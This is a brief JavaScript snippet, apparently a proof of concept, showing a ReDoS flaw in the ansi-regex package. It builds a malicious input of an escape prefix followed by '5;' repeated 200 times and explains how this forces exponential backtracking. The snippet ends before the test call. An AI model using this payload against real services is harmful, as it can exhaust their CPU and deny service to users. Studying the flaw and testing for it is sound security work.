  const ansiRegex = require('ansi-regex');

  // Payload triggers exponential backtracking in the vulnerable regex.
  // '\x1b[' starts an escape sequence, but '5;' repeats without a 
  // terminating character that satisfies the pattern's final alternatives.
  const maliciousInput = '\x1b[' + '5;'.repeat(200);

  // Executing .test() forces V8 to attempt matching the ambiguous quantifier chain:
  // \d{1,4}(?:;\d{0,4})*
